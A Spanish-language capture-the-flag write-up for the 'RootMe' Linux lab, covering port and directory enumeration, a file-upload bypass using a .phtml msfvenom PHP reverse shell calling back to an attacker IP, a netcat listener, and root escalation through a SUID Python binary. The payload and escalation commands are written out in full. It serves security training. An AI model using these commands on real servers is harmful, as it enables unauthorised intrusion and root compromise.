# RootMe

## 🖥️ Sistema

Linux

---

## 🎯 Objetivo del laboratorio

Comprometer una máquina Linux explotando una funcionalidad vulnerable de subida de archivos para obtener una **reverse shell**, acceder al sistema como **www-data** y escalar privilegios mediante un binario **SUID** hasta conseguir acceso como **root**.

---

## 🛠️ Tecnologías trabajadas

- File Upload
- Reverse Shell
- msfvenom
- Netcat
- Gobuster
- Python
- SUID
- GTFOBins

---

## 🧠 Metodología

La enumeración inicial mostró únicamente los servicios **HTTP** y **SSH**, por lo que el foco principal pasó a ser la aplicación web. Al no encontrar información relevante en la página principal ni en el código fuente, decidí ampliar la enumeración mediante fuzzing para descubrir funcionalidades ocultas.

La búsqueda de directorios permitió localizar un panel de subida de archivos y un directorio donde se almacenaban los ficheros subidos. Esta combinación indicaba una posible vulnerabilidad de **File Upload**, por lo que la estrategia consistió en intentar ejecutar código PHP desde el servidor.

Cuando comprobé que el servidor bloqueaba archivos con extensión `.php`, busqué una alternativa compatible con el intérprete PHP. Cambiar la extensión permitió evadir la restricción y ejecutar correctamente una **reverse shell**.

Tras obtener acceso al sistema, realicé la enumeración habitual para identificar usuarios y posibles vectores de escalada. Al no existir permisos interesantes mediante `sudo`, la investigación se centró en los binarios **SUID**, encontrando un binario de Python vulnerable que permitía ejecutar una shell con privilegios elevados.

Este laboratorio demuestra cómo un filtrado insuficiente de extensiones durante la subida de archivos puede terminar comprometiendo completamente un servidor.

---

## 🚀 Explotación

### 1. Enumeración inicial

Comencé comprobando la conectividad con la máquina mediante `ping` y confirmé que se trataba de un sistema Linux gracias al TTL obtenido.

Posteriormente realicé un escaneo completo utilizando Nmap.

```bash
nmap -p- --open -sS -sC -sV --min-rate 5000 -n -Pn 10.10.241.33
```

Se identificaron los siguientes servicios:

| Puerto | Servicio |
|---------|----------|
| 22 | SSH |
| 80 | HTTP |

---

### 2. Enumeración web

La página principal únicamente mostraba un texto informativo y no existían pistas relevantes en el código fuente.

Realicé una enumeración de directorios utilizando Gobuster.

```bash
gobuster dir -u http://10.10.241.33 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

Durante la enumeración aparecieron dos recursos especialmente interesantes:

- `/uploads`
- `/panel`

El directorio `uploads` permitía visualizar los archivos almacenados en el servidor, mientras que `panel` ofrecía una funcionalidad para subir nuevos archivos.

---

### 3. Explotación de la subida de archivos

La combinación de un panel de subida y un directorio accesible desde la web sugería una posible vulnerabilidad de **File Upload**.

Generé una reverse shell en PHP utilizando **msfvenom**.

```bash
msfvenom -p php/reverse_php LHOST=10.23.88.247 LPORT=443 --f raw > pwned.php
```

El servidor rechazaba cualquier archivo con extensión `.php`.

Para evitar esta restricción cambié la extensión del archivo por otra compatible con PHP.

```bash
mv pwned.php pwned.phtml
```

El nuevo archivo fue aceptado correctamente y quedó almacenado dentro del directorio `/uploads`.

Preparé un listener mediante Netcat.

```bash
nc -lvnp 443
```

Al acceder al archivo desde el navegador, la reverse shell se ejecutó correctamente.

---

### 4. Acceso inicial

Una vez obtenida la conexión, abrí una nueva reverse shell más estable hacia otro puerto y realicé el tratamiento habitual de la TTY.

```bash
script /dev/null -c bash
```

Posteriormente configuré correctamente el terminal.

```bash
stty raw -echo
reset xterm
export TERM=xterm
export SHELL=bash
```

La shell obtenida pertenecía al usuario:

```
www-data
```

Durante la exploración localicé la primera flag:

```
user.txt
```

---

### 5. Enumeración interna

Comencé revisando los usuarios existentes.

```bash
cat /etc/passwd
```

Los usuarios más interesantes eran:

- root
- rootme
- test

Posteriormente comprobé los permisos disponibles.

```bash
sudo -l
```

No existían permisos interesantes para el usuario comprometido.

Por ello pasé a buscar binarios SUID.

```bash
find / -perm -4000 2>/dev/null
```

---

### 6. Escalada de privilegios

Durante la enumeración apareció un binario especialmente interesante:

```
/usr/bin/python
```

Consultando GTFOBins comprobé que podía utilizarse para obtener una shell privilegiada.

Ejecuté el siguiente comando:

```bash
/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Tras su ejecución obtuve una shell como **root**.

Finalmente accedí al directorio:

```
/root
```

y recuperé la última flag del laboratorio.

---

## 📚 Lecciones aprendidas

- Este laboratorio permitió comprender cómo una vulnerabilidad aparentemente sencilla de subida de archivos puede convertirse en una ejecución remota de código sobre el servidor.- Detectar funcionalidades vulnerables de **File Upload**.
- Generar payloads PHP mediante **msfvenom**.
- Evadir restricciones de subida modificando la extensión del archivo.
- Ejecutar reverse shells desde un directorio accesible mediante HTTP.
- Estabilizar una shell interactiva utilizando herramientas propias de Linux.
- Enumerar usuarios y revisar permisos tras obtener acceso inicial.
- Buscar y explotar binarios **SUID** utilizando GTFOBins.
- Escalar privilegios mediante un binario **Python** con permisos SUID.

### Reflexión

La principal enseñanza de esta máquina fue comprobar que restringir únicamente la extensión `.php` no es una medida de seguridad suficiente para proteger un sistema frente a ataques de subida de archivos. La posibilidad de utilizar extensiones alternativas como `.phtml` permitió ejecutar código arbitrario sin necesidad de explotar vulnerabilidades adicionales. Además, el laboratorio reforzó la importancia de revisar siempre los binarios SUID tras obtener acceso inicial, ya que continúan siendo uno de los vectores de escalada más frecuentes en entornos Linux.
